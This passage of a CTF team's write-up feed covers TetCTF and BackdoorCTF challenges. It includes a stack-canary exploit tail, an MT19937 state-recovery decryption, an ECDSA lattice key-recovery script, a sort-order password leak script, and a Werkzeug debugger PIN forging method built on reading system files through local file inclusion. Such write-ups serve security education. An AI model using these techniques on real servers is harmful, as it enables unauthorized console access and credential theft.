#Rewrite rbp rbp_offset = BUF_SIZE + 8 for idx,byte in zip(range(rbp_offset+8,rbp_offset,-1),p64(0)[::-1]): writeByte(p,byte,idx) #Rewrite canary for idx,byte in zip(range(BUF_SIZE+8,BUF_SIZE,-1),p64(canary)[::-1]): writeByte(p,byte,idx) # Input 0 and enter to trigger the return p.interactive() ","permalink":"https://b6a.black/posts/2023-01-09-tetctf-pwn01/","summary":"I did not solve it in time (30 minutes late T.T). However, I spent quite of lot of time on this challenge, so I might as well do a write up. Special thanks to Mystiz, fsharp, cire meat pop for helping me on this challenge.","title":"TetCTF 2023: pwn01"},{"content":"We played BackdoorCTF and we won the second place.\nReversing 5p4gh3tt1 (12 solves) Solved by harrier and fsharp\nWe need to provide a recipe to the new spaghetti machine Sanji just bought. The recipe must satisfy several conditions which need to be reverse-engineered.\nThe binary given is a Rust program that checks whether a user-provided recipe is valid. After analyzing it in Ghidra, a namespace called chall could be found. Inside it, you could find several functions, one of which is the main function. Its logic is basically:\nprint(\u0026#34;Enter your great spaghetti recipe:\u0026#34;) recipe = new_recipe() if boiling_spaghetti(recipe) and chopping_veggies(recipe) and garnishing(recipe): print(\u0026#34;It is indeed a great recipe!\u0026#34;) else: print(\u0026#34;You call this your great recipe? Disappointing.\u0026#34;) new_recipe() This is where the program receives user input. It also performs a length check which, if failed, would make the program exit early.\nimport sys def new_recipe(): recipe = input() if len(recipe) != 40: print(\u0026#34;Are you sure this is a spaghetti recipe?\u0026#34;) sys.exit() return recipe So, our recipe needs to be exactly 40 characters long.\nPart 1: boiling_spaghetti() From here onwards, 3 functions would be called, each of which would be called only if the function before it succeeded. Each function checks whether a specific part of the recipe is correct.\nboiling_spaghetti() turns each of the first 10 characters of the recipe into a value, which depends on the character position and value modulo 2. Afterwards, these values are checked against 10 hardcoded values.\ndef add_oil(ingredient): return ((((ingredient + 3) ^ 0x4f) + 0x31) ^ 0x44) + 9 def add_pepper(ingredient): return ((ingredient ^ 0x38) + 6) ^ 5 def add_salt(ingredient): return ingredient * 4 + 6 def add_water(ingredient): return (ingredient + 0x58) ^ 0x4d def boiling_spaghetti(recipe): vals = [] encoded = [0xb7, 0x29, 0x1af, 0x72, 0x207, 0xfa, 0x167, 0xd1, 0xc1, 0x13] for i in range(10): ingredient = recipe[i] if i % 2 == 0: if ingredient % 2 == 0: val = add_oil(add_water(ingredient)) # 1st branch else: val = add_water(add_salt(ingredient)) # 2nd branch else: if ingredient % 2 == 0: val = add_pepper(add_oil(ingredient)) # 3rd branch else: val = add_salt(add_oil(ingredient)) # 4th branch vals.append(val) return vals == encoded We decided to bruteforce the possible characters for all branches for each value:\ndef add_oil_rev(ingredient): return ((((ingredient - 9) ^ 0x44) - 0x31) ^ 0x4f) - 3 def add_pepper_rev(ingredient): return ((ingredient ^ 5) - 6) ^ 0x38 def add_salt_rev(ingredient): return (ingredient - 6) // 4 def add_water_rev(ingredient): return (ingredient ^ 0x4d) - 0x58 encoded = [0xb7, 0x29, 0x1af, 0x72, 0x207, 0xfa, 0x167, 0xd1, 0xc1, 0x13] for ingredient in encoded: a = add_water_rev(add_oil_rev(ingredient)) b = add_salt_rev(add_water_rev(ingredient)) c = add_oil_rev(add_pepper_rev(ingredient)) d = add_oil_rev(add_salt_rev(ingredient)) if not 32 \u0026lt;= a \u0026lt;= 126: a = 0 if not 32 \u0026lt;= b \u0026lt;= 126: b = 0 if not 32 \u0026lt;= c \u0026lt;= 126: c = 0 if not 32 \u0026lt;= d \u0026lt;= 126: d = 0 print(f\u0026#34;\u0026#39;{chr(a)}\u0026#39;, \u0026#39;{chr(b)}\u0026#39;, \u0026#39;{chr(c)}\u0026#39;, \u0026#39;{chr(d)}\u0026#39;\u0026#34;) The output is\n'f', ''', ' ', 'v' ' ', ' ', 'l', ' ' ' ', 'a', ' ', ' ' ' ', ' ', ' ', 'g' ' ', '{', ' ', 'J' '-', ' ', ' ', 'm' ' ', '3', ' ', ' ' ' ', ' ', '4', 'p' 't', ' ', 'D', '|' ' ', ' ', 'b', ' ' For the 0th, 2nd, 4th, 6th and 8th rows, we consider the possible characters in the first two branches. For the other rows, we consider those in the remaining two branches.\nHere, we guessed that the first part of the recipe is flag{m34tb since it\u0026rsquo;s related to food. m34tb is \u0026lsquo;meatb\u0026rsquo; in leetspeak, which is likely to be the beginning of \u0026lsquo;meatballs\u0026rsquo;, and meatballs could be found in some spaghetti recipes.\nPart 2: chopping_veggies() This is the most complicated part in our opinion. Some operations are done to determine the values of 3 variables, which depend on the first 10 characters of the recipe. These 3 variables would later be used to turn the 11th to 30th characters of the recipe into values that would be checked against 20 hardcoded values.\ndef chop_veggies(veggie, quant): remainder = veggie % 3 if remainder == 0: return (veggie * quant) ^ quant elif remainder == 1: return (veggie ^ quant) * quant return (veggie * quant) ^ veggie def chopping_veggies(recipe): vals = [] encoded = [0x28e00, 0x9925, 0x5a9e, 0x4fb5, 0x85a8, 0xbcec, 0xa56e, 0x17b55, 0x4f35, 0x4fb5, 0x18c41, 0xbcec, 0x2da80, 0x92c0, 0x2a74, 0xae74, 0xa3e0, 0xc11a, 0x8edf, 0x1ec25] # \u0026lt;complicated operations omitted\u0026gt; quant1 = ??? quant2 = ??? quant3 = ??? for i in range(10, 30): veggie = recipe[i] remainder = (i - 10) % 3 if remainder == 0: val = chop_veggies(veggie, quant1) elif remainder == 1: val = chop_veggies(veggie, quant2) else: val = chop_veggies(veggie, quant3) vals.append(val) return vals == encoded Dynamic analysis comes to the rescue. By entering flag{m34tb and 30 bytes of gibberish as the recipe, it is found that quant1 = 384, quant2 = 361, and quant3 = 214. Now it\u0026rsquo;s possible to reverse the operations done on each hardcoded value:\nquant1 = 384 quant2 = 361 quant3 = 214 part2 = \u0026#34;\u0026#34; encoded = [0x28e00, 0x9925, 0x5a9e, 0x4fb5, 0x85a8, 0xbcec, 0xa56e, 0x17b55, 0x4f35, 0x4fb5, 0x18c41, 0xbcec, 0x2da80, 0x92c0, 0x2a74, 0xae74, 0xa3e0, 0xc11a, 0x8edf, 0x1ec25] for i in range(len(encoded)): val = encoded[i] remainder = i % 3 if remainder == 0: quant = quant1 elif remainder == 1: quant = quant2 else: quant = quant3 for c in range(32, 127): if chop_veggies(c, quant) == val: part2 += chr(c) break print(part2) The second part of the recipe is 4ll5_4nd_5p4gh3tt1_4. So we were right about the meatballs after all!\nPart 3: garnishing() garnishing() checks the last 10 characters of the recipe. If any of the characters match 10 specific characters, they are mapped into one of 10 other characters. The string is then reversed and checked against a hardcoded string.\ndef garnishing(recipe): vals = recipe[30:] encoded = \u0026#34;%@!\u0026amp;*/+#.)\u0026#34; trans = {\u0026#39;0\u0026#39;: \u0026#39;/\u0026#39;, \u0026#39;2\u0026#39;: \u0026#39;*\u0026#39;, \u0026#39;3\u0026#39;: \u0026#39;\u0026amp;\u0026#39;, \u0026#39;5\u0026#39;: \u0026#39;)\u0026#39;, \u0026#39;A\u0026#39;: \u0026#39;.\u0026#39;, \u0026#39;L\u0026#39;: \u0026#39;+\u0026#39;, \u0026#39;H\u0026#39;: \u0026#39;@\u0026#39;, \u0026#39;B\u0026#39;: \u0026#39;#\u0026#39;, \u0026#39;}\u0026#39;: \u0026#39;%\u0026#39;, \u0026#39;4\u0026#39;: \u0026#39;!\u0026#39;} table = vals.maketrans(trans) vals = vals.translate(table)[::-1] return vals == encoded Reverse the mappings as follows:\npart3 = \u0026#34;\u0026#34; encoded = \u0026#34;%@!\u0026amp;*/+#.)\u0026#34;[::-1] reverse_trans = {\u0026#39;/\u0026#39;: \u0026#39;0\u0026#39;, \u0026#39;*\u0026#39;: \u0026#39;2\u0026#39;, \u0026#39;\u0026amp;\u0026#39;: \u0026#39;3\u0026#39;, \u0026#39;)\u0026#39;: \u0026#39;5\u0026#39;, \u0026#39;.\u0026#39;: \u0026#39;A\u0026#39;, \u0026#39;+\u0026#39;: \u0026#39;L\u0026#39;, \u0026#39;@\u0026#39;: \u0026#39;H\u0026#39;, \u0026#39;#\u0026#39;: \u0026#39;B\u0026#39;, \u0026#39;%\u0026#39;: \u0026#39;}\u0026#39;, \u0026#39;!\u0026#39;: \u0026#39;4\u0026#39;} for c in encoded: part3 += reverse_trans[c] print(part3) The third part of the recipe is 5ABL0234H}.\nCombining the three parts together, the recipe (i.e. the flag) is flag{m34tb4ll5_4nd_5p4gh3tt1_45ABL0234H}.\nCrypto Fishy (15 solves) Solved by Mystiz and LifeIsHard\nThe original source code has a lot of redundant or over-complicated parts. The charts below show briefly what the code did:\nFrom the source code, we can see that random.getrandbits is used for 256×4=1024 times to generate s_boxes.\nPython uses MT19937 as its pseudorandom number generator. This generator is predictable as we can recover the state from 624 32-bits output. Therefore, we can first get the key by recovering the state, then reverse the enecryption steps.\nStep 1: Recover key We can use the code in this repo to recovering internal state from outputs. https://github.com/twisteroidambassador/mt19937-reversible\nfrom mersenne_twister import * from itertools import chain import random def recover_key(output): stdlib_random = random.Random() mt = MT19937() output_for_cloning = list(chain.from_iterable(s_boxes)) # clone state with the first 624 32-bit random numbers mt.clone_state_from_output(output_for_cloning[0:624]) # check [624:] of s_boxes, confirm the state is recovered generate_new = [mt.get_next_random() for _ in range(len(output_for_cloning) - mt.n)] assert generate_new == output_for_cloning[624:] # get the next 18 32-bit random numbers (which is the key) key = \u0026#39;\u0026#39;.join([hex(mt.get_next_random())[2:].zfill(8) for i in range(18)]) return key s_boxes = eval(open(\u0026#39;s_boxes.txt\u0026#39;,\u0026#39;r\u0026#39;).read().strip()) key = bytes.fromhex(recover_key(s_boxes)) The key is f25933f9b09571c39223c3040d5a43c1695417f8d94659b6f4fd7f8063fc3575d5ad46258df8d08c2916b3c5ed24d92b33bc1d2010959499312f94cc04139ea2727d0b08b03a71b1.\nWe will convert the key to bytes for the next step.\nStep 2: Decrypt After we recovered the key, we can get processed_sub_keys. Then we can decrypt the ciphertext by reversing the steps in source code.\nfrom Crypto.Util.number import bytes_to_long, long_to_bytes modulus = pow(2, 32) ct = bytes.fromhex(\u0026#39;f2b4b9be3b93cb2d8cc762bdf1d6cd57419d5c83d86c31faf9d2a39a829da4f7a831790ec17c1e7d0c7ae6615b6f5343478ccd9424a77e8aa66ef09233b0caee\u0026#39;) initial_sub_keys = [\u0026#39;243f6a88\u0026#39;,\u0026#39;85a308d3\u0026#39;,\u0026#39;13198a2e\u0026#39;,\u0026#39;03707344\u0026#39;,\u0026#39;a4093822\u0026#39;,\u0026#39;299f31d0\u0026#39;,\u0026#39;082efa98\u0026#39;,\u0026#39;ec4e6c89\u0026#39;,\u0026#39;452821e6\u0026#39;,\u0026#39;38d01377\u0026#39;,\u0026#39;be5466cf\u0026#39;,\u0026#39;34e90c6c\u0026#39;,\u0026#39;c0ac29b7\u0026#39;,\u0026#39;c97c50dd\u0026#39;,\u0026#39;3f84d5b5\u0026#39;,\u0026#39;b5470917\u0026#39;,\u0026#39;9216d5d9\u0026#39;,\u0026#39;8979fb1b\u0026#39;,] key = [bytes_to_long(key[4*i:4*i+4]) for i in range(18)] processed_sub_keys = [k^int(sub,16) for k,sub in zip(key, initial_sub_keys)] def decrypt(processed_sub_keys, s_boxes, ct): m = b\u0026#39;\u0026#39; for i in range(0, len(ct), 8): xl, xr = bytes_to_long(ct[i:i+4]), bytes_to_long(ct[i+4:i+8]) xl, xr = xr ^ processed_sub_keys[16], xl ^ processed_sub_keys[17] for j in range(15,-1,-1): new_xl, new_xr = xl, xr xa, xb, xc, xd = long_to_bytes(xl ^ processed_sub_keys[j]) xn = (s_boxes[0][xa] + s_boxes[1][xb]) % modulus xn = s_boxes[2][xc] ^ xn f_out = (xn + s_boxes[3][xd]) % modulus xl, xr = new_xr, new_xl ^ f_out m += long_to_bytes(xl) + long_to_bytes(xr) return m flag = decrypt(processed_sub_keys,s_boxes,ct) print(flag) The flag is flag{d0n't_u53_th3_m3r53nn3_r4nd0m_g3n3r4t0r_w1th0ut_c4ut10n_\u0026lt;3}.\nRandom Nonsense (4 solves) Solved by Mystiz\nChallenge Summary We are given a server that signs up to 49 messages (except the message $m_0$) with a secret key, $d$, with ECDSA over the curve P384. The goal is to forge a signature for the message $m_0$.\nThe sign function specifies on how the signature is created from the message msg.\ndef encode(m: bytes) -\u0026gt; int: m = m.decode() enc_arr = range(1, counter + 1) if len(list(set(m))) == counter: s = set() enc_arr = [] for x in m: if x in s: continue enc_arr.append(MAP[x]) s.add(x) return sum([(-2)**i*x for i, x in enumerate(enc_arr)])%n def sign(msg, d): x = int(hashlib.sha256(long_to_bytes(encode(msg) \u0026amp; random.randrange(1, n - 1))).hexdigest(), 16) % 2**50 while True: k = (random.getrandbits(320) \u0026lt;\u0026lt; 50) + x r = (k*G).x() if r != 0: break m = int(hashlib.sha256(msg).hexdigest(), 16) s = (inv(k)*(m + r*d)) % n return (int(r), int(s)) Solution I spent some time understanding the encode function, but then I noticed the range of k: The size of k is 370 bits long\u0026hellip; It is smaller than 384! Since k is relatively small, we can use LLL to recover the secret key d:\n#!/usr/bin/env python3 # -*- coding: UTF-8 -*- import os from pwn import * import hashlib import ecdsa from ctfools import Challenge as BaseChallenge def sign(msg, d): Curve = ecdsa.NIST384p G = Curve.generator n = int(Curve.order) k = 1337 r = int((k*G).x()) m = int(hashlib.sha256(msg).hexdigest(), 16) s = (pow(k, -1, n)*(m + r*d)) % n return (int(r), int(s)) class Challenge(BaseChallenge): def __init__(self, *args, **kwargs): super().__init__(*args, **kwargs) # self.r.recvline() # Example if you gonna skip one line def _sign_send(self, m): self.r.sendline(b\u0026#39;S\u0026#39;) self.r.sendline(m) def _sign_recv(self): self.r.recvuntil(b\u0026#39;r=\u0026#39;) r = int(self.r.recvuntil(b\u0026#39; \u0026#39;).decode()[:-2]) self.r.recvuntil(b\u0026#39;s=\u0026#39;) s = int(self.r.recvline().decode()) return r, s def main(): _local = \u0026#39;local\u0026#39; in os.environ _log = \u0026#39;log\u0026#39; in os.environ r = Challenge( conn=\u0026#39;nc hack.backdoor.infoseciitr.in 17701\u0026#39;, proc=[\u0026#39;python3\u0026#39;, \u0026#39;challenge/chall.py\u0026#39;], local=_local, log=_log) Curve = ecdsa.NIST384p q = Curve.order m = 49 A = Matrix(ZZ, 2*m+2) weights = [q for _ in range(m)] + [q, 1] + [2^14 for _ in range(m)] log.info(\u0026#39;Signing...\u0026#39;) msgs = [os.urandom(16).hex().encode() for i in range(m)] for msg in msgs: r._sign_send(msg) for i, msg in enumerate(msgs): h = int.from_bytes(hashlib.sha256(msg).digest(), \u0026#39;big\u0026#39;) _r, _s = r._sign_recv() A[0, i ] = h A[1, i ] = _r A[2+i, i ] = -_s A[2+m+i, i ] = q for i in range(m+2): A[i, m+i] = 1 log.info(\u0026#39;Computing LLL...\u0026#39;) Q = diagonal_matrix(weights) A *= Q A = A.LLL() A /= Q for row in A: if row[m] \u0026lt; 0: row = -row if row[m] != 1: continue if min(row[:m]) \u0026lt; 0: continue if max(row[:m]) \u0026gt; 0: continue d = int(row[m+1]) break else: assert False, \u0026#39;no good!\u0026#39; _r, _s = sign(b\u0026#39;Sign me to get the flag\u0026#39;, d) log.success(f\u0026#39;{_r = }\u0026#39;) log.success(f\u0026#39;{_s = }\u0026#39;) r.r.sendline(b\u0026#39;V\u0026#39;) r.r.sendline(b\u0026#39;Sign me to get the flag\u0026#39;) r.r.sendline(str(_r).encode()) r.r.sendline(str(_s).encode()) r.interactive() if __name__ == \u0026#39;__main__\u0026#39;: main() # flag{y0u_g07_7h3_h1dd3n_p3rmu7a710n_pR0bL3m} Morph (2 solves) Solved by Mystiz\nChallenge Description Let $M$ be a square matrix. Define $M^{[n]}$ by\n$$M^{[n]} = {H_1}^{n-1} \\cdot M \\cdot {H_2}^{n-1} + {H_1}^{n-2} \\cdot M \\cdot {H_2}^{n-2} + \u0026hellip; + M.$$\nWe are given a prime $p$ and $4 \\times 4$ matrices $H_1$, $H_2$, $M$, $A$ and $B$ such that\n $H_1$ and $H_2$ are singular, $A = M^{[\\alpha]}\\ \\text{mod} \\ p$ and $B = M^{[\\beta]}\\ \\text{mod}\\ p$ for some unknowns $\\alpha$ and $\\beta$.  The goal is to find $S := M^{[\\alpha + \\beta]}\\ \\text{mod}\\ p$.\nSolution We tried multiple approaches but in vain. For instance we\n expressed everything mathematically and see if there is something fishy, tried to see if the discrete log can be easily computed, or even predicted the number generated by Python\u0026rsquo;s random\u0026hellip;  Eventually, we came across to the paper Cryptanalysis of Semidirect Product Key Exchange Using Matrices Over Non-Commutative Rings. The challenge is implementing the key exchange mentioned in the paper, which is shown to be fragile. Therefore we followed the steps given by section 3 and got the flag: flag{y0u_c4n_M$K#_7h3_74bl3s_7Urn}.\nWeb S3KSU4L_INJ3C710N (10 solves) Solved by Viky\nChallenge description The challenge provides an web application with its source code. Once accessing the site URL, you can see the site returning a list of users.\nSource code Let us take look on what this application does from the provided source code. The following is the API which was used to retrieve users from database.\n@app.route('/api/data') def data(): query = User.query total_filtered = query.count() col_index = request.args.get('order[0][column]') flag=1 if col_index is None: col_index=0 flag=0 col_name = request.args.get(f'columns[{col_index}][data]') users=[user.to_dict() for user in query] descending = request.args.get(f'order[0][dir]') == 'desc' try: if descending: users=sorted(users,key=lambda x:helper(x,col_name),reverse=True) else : users=sorted(users,key=lambda x:helper(x,col_name),reverse=False) except: pass start = request.args.get('start', type=int) length = request.args.get('length', type=int) users=users[start:start+length] for user in users: del user['password'] if flag==0: random.shuffle(users) return { 'data': users, 'recordsFiltered': total_filtered, 'recordsTotal': 500, 'draw': request.args.get('draw', type=int), } As you can see there are only a few meaningful parameters\n order[0][column]  Assignes the user provided value to the variable col_index   columns[{col_index}][data]  Based on the user provided value, col_name would be used to sort the users via helper function   order[0][dir]  Determines if the returned users are sorted in ascending or descending order   start  Detemines the starting index of the returned users list   length  Determines the length of the returned users list   draw  Determines the value of draw. Not that useful.    This implies we can control how many users being returned from the API and how it could be sorted.\nWe should also check how users are defined. The following code are ran on server start.\nfaker=Faker() hexc=[] for i in range(16): hexc.append(hex(i)[2:]) for i in range(50): random.shuffle(hexc) passwords=[] lucky=random.randint(100,400) f=open('users.txt','w') for i in range(500): random.shuffle(hexc) passwords.append(\u0026quot;\u0026quot;.join(hexc)) name=faker.name() phone=faker.phone_number() if phone[0]!='+': phone='+'+phone if i == lucky: name='Adm1n_h3r3_UwU' f.write(name+'||'+passwords[i]+'||'+faker.address().replace('\\n',', ')+'||'+phone+'||'+faker.email()) f.write('\\n') f.close() Basically this code provides the following information\n The hexc variable is a list of 16 characters ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'] There are 500 users with one random user will be assigned a special name Adm1n_h3r3_UwU. A password will be created for each user by shuffling the hexc variable with function random.shuffle, so we can tell the password will be of length 16, with 16! of possible permutation  Challenge Analysis So after all that work, what is the flag for this challenge? What? You don\u0026rsquo;t have any idea? Well, it was quite obvious to see that the password of that special user is the flag of this challenge.\nThe password is removed before returning user data from /api/data. Is there a way to obtain the password of the user Adm1n_h3r3_UwU?\nBasically what we could do is that we can query the users and sort them with any column, including password. However, a password may have 16! permutation, thus it is not that helpful if we sort users with the entire password. We can do better. Let us have a look how help was defined.\ndef helper(data, prop, is_data=False): pr = prop.split('.') pr1= prop.split('.') count=0 for p in pr: if count == 2: return None count+=1 pr1=pr1[1:] nextprop = '.'.join(pr1) if hasattr(data, p): if nextprop=='': return getattr(data, p) return helper(getattr(data, p), nextprop, True) ...snip... elif type(data) == list or type(data) == tuple or type(data)==str: try: if nextprop=='': return data[int(p)] return helper(data[int(p)], nextprop, True) except (ValueError, TypeError, IndexError): return None else: return None if is_data: return data else: return None What does this do? Let us ask ChatGPT.\nThis is a recursive function that takes in a data object, a property string, and an optional boolean flag and returns the value at the specified property of the data object if it exists, or None if it does not exist. The property string can include dots to indicate nested properties and the function will traverse the data object accordingly. The optional boolean flag is used to indicate whether the data object being passed to the function is the original data object or a nested data object. This means we can sort users by user.password.__repr__ by setting the GET parameter columns[{col_index}][data] to password.__repr__. Is this useful? Not really. However, what happens if you provide an integer? What if we pass password.0?\nelif type(data) == list or type(data) == tuple or type(data)==str: try: if nextprop=='': return data[int(p)] return helper(data[int(p)], nextprop, True) user.password is a string and 0 is the last property, nextprop will be '', then data[int(p)] would be returned. This meansuser.password.0 will be interperted asuser.password[0]. This implies we can sort users by each character of the password. With this information we can sort the users by each index of the password and guess each character.\nExploitation First attempt, assuming that the password character set is evenly distributed, divide the users into 16 chunks and guess the admin password by checking which chunk the admin is at. Gets a479ce51ec083f27. This was obviously wrong as there are duplicated characters.\nSecond attempt, I tried to sort the index of admin in user lists of each password index in ascending order and assign the smallest admin index to the first character in the sortedhexc at the corresponding password index and so on. This yeilds a479be51dc083f26 which is also wrong, but is actually quite close to the correct password.\nThird attempt, thanks to mystiz613 for observing the in-place property of the function sorted(), we can know the exact character of each index of the password by observing index of users in ascending and descending orders. In particular, the users are sorted in-place which would occupy the same storage as the original ones when there is a tie as the following code implied.\ntry: if descending: users=sorted(users,key=lambda x:helper(x,col_name),reverse=True) else : users=sorted(users,key=lambda x:helper(x,col_name),reverse=False) Let us take a moment to appreciate the following screenshot from mystiz which illustrate the in-place property of users sorted ascendingly and descendingly.\nSo basically we can determine the different chunks of users by comparing the list of sorted users from ascending order and descending order.\nConsider the following list sorted by the first character of password ascendingly.\n[ {\u0026quot;user\u0026quot;:2,\u0026quot;password\u0026quot;:\u0026quot;0213\u0026quot;}, {\u0026quot;user\u0026quot;:7,\u0026quot;password\u0026quot;:\u0026quot;0132\u0026quot;}, {\u0026quot;user\u0026quot;:1,\u0026quot;password\u0026quot;:\u0026quot;1230\u0026quot;}, {\u0026quot;user\u0026quot;:4,\u0026quot;password\u0026quot;:\u0026quot;1203\u0026quot;}, {\u0026quot;user\u0026quot;:6,\u0026quot;password\u0026quot;:\u0026quot;2103\u0026quot;}, {\u0026quot;user\u0026quot;:5,\u0026quot;password\u0026quot;:\u0026quot;2130\u0026quot;}, {\u0026quot;user\u0026quot;:3,\u0026quot;password\u0026quot;:\u0026quot;3120\u0026quot;}, {\u0026quot;user\u0026quot;:8,\u0026quot;password\u0026quot;:\u0026quot;3102\u0026quot;}, ] If we sorted the first character of password descendingly, we would get the following.\n[ {\u0026quot;user\u0026quot;:3,\u0026quot;password\u0026quot;:\u0026quot;3120\u0026quot;}, {\u0026quot;user\u0026quot;:8,\u0026quot;password\u0026quot;:\u0026quot;3102\u0026quot;}, {\u0026quot;user\u0026quot;:6,\u0026quot;password\u0026quot;:\u0026quot;2103\u0026quot;}, {\u0026quot;user\u0026quot;:5,\u0026quot;password\u0026quot;:\u0026quot;2130\u0026quot;}, {\u0026quot;user\u0026quot;:1,\u0026quot;password\u0026quot;:\u0026quot;1230\u0026quot;}, {\u0026quot;user\u0026quot;:4,\u0026quot;password\u0026quot;:\u0026quot;1203\u0026quot;}, {\u0026quot;user\u0026quot;:2,\u0026quot;password\u0026quot;:\u0026quot;0213\u0026quot;}, {\u0026quot;user\u0026quot;:7,\u0026quot;password\u0026quot;:\u0026quot;0132\u0026quot;}, ] In our simplfied scenario, password is 4 character long with range from 0 to 3. In a large enough sample size (16 characters randomly distributed among 500 users), we can say it is very likely that every single character will appear at each index of the password. There are some facts that we can tell from the two list:\n user 2 password starts with 0 as it is the first element of the ascending list user 7 password starts with 0 as it is the last element of the decending list Any users between user 2 and user 7 have password starts as 0 as the list is sorted We can deduce user 1 password starts with 1 as it is right after user 7 in the ascending list. We can deduce user 4 password starts with 1 as it is right before user 2 in the decending list. And so on until reaching the end of the list  We can tell what is the corresponding password character for users from their corresponding index in the user list. After we have the mapping, we just have to find the index of user Adm1n_h3r3_UwU and determine the character of password at a particular index. Repeat the query from password.0 to password.15 to obtain the entire password of user Adm1n_h3r3_UwU\nSolve script import requests url = \u0026#34;http://hack.backdoor.infoseciitr.in:16052/api/data\u0026#34; query_params = { \u0026#34;columns[0][data]\u0026#34;: \u0026#34;password.2\u0026#34;, \u0026#34;columns[0][passwords]\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;order[0][column]\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;order[0][dir]\u0026#34;: \u0026#34;AAA\u0026#34;, \u0026#34;start\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;length\u0026#34;: \u0026#34;500\u0026#34; } password_charset = [\u0026#39;0\u0026#39;, \u0026#39;1\u0026#39;, \u0026#39;2\u0026#39;, \u0026#39;3\u0026#39;, \u0026#39;4\u0026#39;, \u0026#39;5\u0026#39;, \u0026#39;6\u0026#39;, \u0026#39;7\u0026#39;, \u0026#39;8\u0026#39;, \u0026#39;9\u0026#39;, \u0026#39;a\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;c\u0026#39;, \u0026#39;d\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;f\u0026#39;] def get_index_from_list(lst, name): for i, v in enumerate(lst): if(v[\u0026#34;name\u0026#34;] == name): return i return None idxs = [] temp_map = {} password = \u0026#34;\u0026#34; for i in range(16): query_params[\u0026#34;columns[0][data]\u0026#34;] = f\u0026#34;password.{i}\u0026#34; query_params[\u0026#34;order[0][dir]\u0026#34;] = \u0026#34;asce\u0026#34; response = requests.get(url, params=query_params, verify=False) if response.status_code == 200: data = response.json()[\u0026#34;data\u0026#34;] admin_index = next((index for (index, d) in enumerate(data) if d[\u0026#34;name\u0026#34;] == \u0026#34;Adm1n_h3r3_UwU\u0026#34;), None) else: print(\u0026#34;Request failed with status code:\u0026#34;, response.status_code) query_params[\u0026#34;order[0][dir]\u0026#34;] = \u0026#34;desc\u0026#34; response = requests.get(url, params=query_params, verify=False) if response.status_code == 200: data_rev = response.json()[\u0026#34;data\u0026#34;] else: print(\u0026#34;Request failed with status code:\u0026#34;, response.status_code) a = [0] b = [len(data_rev)] j = 0 while True: temp_rev_idx = get_index_from_list(data_rev,data[a[j]][\u0026#34;name\u0026#34;]) temp_len = len(data_rev[temp_rev_idx:b[j]]) temp_idx = a[j] + temp_len a.append(temp_idx) b.append(temp_rev_idx) j += 1 if temp_idx \u0026gt;= 500: break for k,c in zip(range(0,len(a)-1),password_charset): x = range(a[k],a[k+1]) if(admin_index in x): password += c print(f\u0026#34;password at idx {i}: {c}\u0026#34;) break print(password) The output of the script yields a469ce51db083f27\nKonsolation prize (11 solves) Solved by J4cky, Ja5on\nThree endpoints were found after some directory enumeration.\n /admin shows the error debug log, exposing information about this challenge: the backend is Python Flask + Jinja2 + Werkzeug \u0026amp; the endpoint /article takes a GET parameter name /console is the Werkzeug debugger console, pin is required /article shows an error message [Errno 2] No such file or directory: 'article'  From the source code shown in the error debug log \u0026lt;a href='/article?name=article'\u0026gt;, we can correlate with this error message that the server is trying to open the file which is the value of the GET parameter name. Hence there is a LFI and we can make use of this to calculate the pin for the console. By LFI the Werkzeug’s debug __init__.py, variables needed are:\n username who started this Flask, can be found from /proc/self/environ modname which is flask.app getattr(app, '__name__', getattr (app .__ class__, '__name__')) which is Flask getattr(mod, '__file__', None) the absolute path of app.py in the flask directory, can be found from the error debug log uuid.getnode() MAC address of the server, first get the device ID from /proc/net/arp (which is eth0), then get the MAC address from /sys/class/net/\u0026lt;device id\u0026gt;/address (i.e., /sys/class/net/eth0/address) get_machine_id() this is the most tricky one as it various according to the version of Werkzeng. For this time, it requires the value of either /etc/machine-id or /proc/sys/kernel/random/boot_id appending with the value after the 3rd slash of the first line in /proc/self/cgroup. Since /etc/machine-id doesn\u0026rsquo;t exist, we will append the value of /proc/sys/kernel/random/boot_id with the value in /proc/self/cgroup as shown below. (P.S. this value would be changed after the server is restarted)  It should be noted that the hashing algorithm is SHA1 instead of MD5 (old version).\nA sample script for generating the pin:\nimport hashlib from itertools import chain rv = None num = None probably_public_bits = [ \u0026#39;r00t-user\u0026#39; , # username /proc/self/environ \u0026#39;flask.app\u0026#39; , # modname \u0026#39;Flask\u0026#39;, # getattr(app, \u0026#39;__name__\u0026#39;, getattr(app.__class__, \u0026#39;__name__\u0026#39;)) \u0026#39;/usr/local/lib/python3.9/site-packages/flask/app.py\u0026#39; # getattr(mod, \u0026#39;__file__\u0026#39;, None) ] private_bits = [ \u0026#39;2485377892355\u0026#39; , # /sys/class/net/eth0/address 02:42:ac:11:00:03 \u0026#39;d5a09294-c0e7-4cf9-a10b-4cdb79f8620cf6583bfe596e2de1979391a591ec7c07363bc587eb59051cf7237b4a5762f39b\u0026#39; # /proc/sys/kernel/random/boot_id + /proc/self/cgroup ] h = hashlib.sha1() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode(\u0026#39;utf-8\u0026#39;) h.update(bit) h.update(b\u0026#39;cookiesalt\u0026#39;) num = None if num is None: h.update(b\u0026#39;pinsalt\u0026#39;) num = (\u0026#39;%09d\u0026#39; % int(h.hexdigest(), 16))[:9] rv =None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = \u0026#39;-\u0026#39;.join(num[x:x + group_size].rjust(group_size, \u0026#39;0\u0026#39;) for x in range(0, len(num), group_size)) break else: rv = num print(rv) Finally with the correct pin and the good timing that the console was not locked due to too many failed attempt, we were able to use the interactive console to TRY TO get the hidden flag\u0026hellip; Spent some time checking from different directories with no luck\u0026hellip;then @harrier suggested we may try to search for the files with most recent updated time, so we can use find / -mtime 0 and got the result:\n...\u0026lt;snip\u0026gt;... /usr/share/doc/procps /usr/share/doc/libprocps8 /usr/share/doc/psmisc /usr/srv /usr/srv/secrets /usr/srv/secrets/y0u_f0und_m3_l0l.txt /challenge /challenge/public /.dockerenv /src /src/app /src/app/__pycache__ /src/app/__pycache__/server.cpython-310.pyc /src/app/templates /src/app/templates/main.html /src/app/templates/article.html /src/app/templates/base.html /src/app/server.py Finally we got the flag from 